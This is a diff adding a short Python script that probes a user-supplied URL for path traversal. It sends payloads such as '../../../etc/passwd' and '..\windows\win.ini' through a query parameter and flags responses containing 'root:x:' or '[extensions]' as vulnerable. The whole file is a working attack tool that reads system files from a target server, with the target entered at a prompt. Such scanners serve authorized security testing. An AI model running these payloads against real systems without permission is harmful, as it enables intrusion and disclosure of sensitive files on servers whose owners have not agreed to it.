@@ -1,0 +1,28 @@
+import requests
+
+def test_path_traversal(url, param="file"):
+    payloads = [
+        "../etc/passwd",
+        "../../etc/passwd",
+        "../../../etc/passwd",
+        "../../../../etc/passwd",
+        "../../../../../../windows/win.ini",
+        "..\\..\\..\\..\\windows\\win.ini"
+    ]
+
+    print(f"[*] Testing {url} with potential path traversal payloads...\n")
+
+    for payload in payloads:
+        full_url = f"{url}?{param}={payload}"
+        try:
+            response = requests.get(full_url, timeout=5)
+            if "root:x:" in response.text or "[extensions]" in response.text:
+                print(f"[+] Vulnerable! Successful payload: {full_url}")
+            else:
+                print(f"[-] Attempt failed: {full_url}")
+        except requests.RequestException as e:
+            print(f"[!] Error accessing {full_url}: {e}")
+
+if __name__ == "__main__":
+    target = input("Enter the target URL (e.g., http://site.com/download): ").strip()
+    test_path_traversal(target)
